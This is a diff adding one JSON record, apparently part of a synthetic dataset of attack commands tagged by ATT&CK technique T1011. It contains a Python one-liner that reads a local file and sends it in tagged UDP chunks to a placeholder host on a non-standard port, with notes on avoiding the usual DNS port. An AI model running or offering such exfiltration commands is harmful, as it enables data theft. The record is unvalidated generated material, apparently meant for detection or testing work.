@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,uuid; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"203.0.113.200\", 53530); tid=str(uuid.uuid4()).encode(); d=open(\"/Users/Shared/.dmp\",\"rb\").read(); [ s.sendto(tid+b\"|\"+d[i:i+500], addr) for i in range(0,len(d),500) ]; s.close()'",
+  "explanation": "Chunks data into UUID-tagged UDP datagrams to a high, non-standard port, simulating a DNS-like alternate medium without using the common DNS port, aligning with T1011.",
+  "rationale_steps": [
+    "Open a UDP socket and choose a non-standard high port (53530) to avoid 53.",
+    "Tag each chunk with a transaction ID to reassemble remotely.",
+    "Use UDP as an alternate medium distinct from primary C2 channels.",
+    "No obfuscation; user-space only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-022e3e02",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
